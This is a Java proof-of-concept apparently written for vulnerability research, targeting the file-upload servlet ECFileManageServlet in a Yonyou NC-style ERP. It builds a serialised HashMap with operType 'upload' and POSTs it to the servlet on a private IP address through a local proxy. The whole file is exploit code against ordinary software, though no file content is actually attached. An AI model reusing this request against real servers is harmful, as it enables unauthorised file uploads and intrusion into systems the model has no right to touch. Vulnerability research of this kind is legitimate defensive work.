package cve.nc;

import com.pacemrc.vuldebug.common.utils.http.HttpRequest;
import nc.impl.ecpubapp.filemanager.service.ECFileManageServlet;


import nc.vo.ecpubapp.pattern.data.CaParaVO;
import org.apache.http.client.methods.HttpPost;
import java.io.*;
import java.util.HashMap;

public class FileManagerImpl_fileupload {


    public static HashMap<String,String> makeMap(){
        HashMap<String, String> hashMap = new HashMap<>();
        hashMap.put("dsName","dsName");
        hashMap.put("operType","upload");
        hashMap.put("fileLength","10");
        hashMap.put("user_code","user_code");

        return hashMap;
    }

    public static CaParaVO makeCaParaVO(){

        CaParaVO caParaVO = new CaParaVO();
        caParaVO.setGroupId("0000");
        caParaVO.setUserId("1111");
        caParaVO.setIsCa(true);

        return caParaVO;
    }



    public static void main(String[] args) throws IOException {

        String  url = "http://10.58.120.201/servlet/~ecapppub/nc.impl.ecpubapp.filemanager.service.ECFileManageServlet";

        HashMap<String, String> hashMap = makeMap();
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(hashMap);
        oos.close();
        baos.close();

        HttpRequest httpRequest = new HttpRequest("127.0.0.1", 8080);
        HttpPost httpPost = new HttpPost(url);

        httpRequest.sendByteArrayPost(httpPost, baos.toByteArray());


    }
}
